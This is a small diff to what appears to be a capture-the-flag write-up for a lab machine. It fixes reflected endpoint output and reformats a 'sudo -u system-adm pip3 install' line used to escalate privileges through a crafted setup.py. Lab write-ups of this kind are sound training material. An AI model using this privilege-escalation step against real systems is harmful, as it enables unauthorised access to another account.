@@ -57,7 +57,7 @@ curl http://10.10.47.50:8080/index7
 ```
 <h2>SORRY!</h2>
 <h3 class="font-weight-light">The page you’re looking for was not found.</h3>
-<b>No results for <b> index1 </b>
+<b>No results for <b> index7 </b>
 ```
 
 **Finding** Our endpoint is being replayed back to us
@@ -158,7 +158,7 @@ setup(
 )
 EOF
 
-sudo -u system-adm /usr/bin/pip3 install $TF
+web@vulnnet-dotpy:/tmp$ sudo -u system-adm /usr/bin/pip3 install $TF
 ```
 
 **Result**
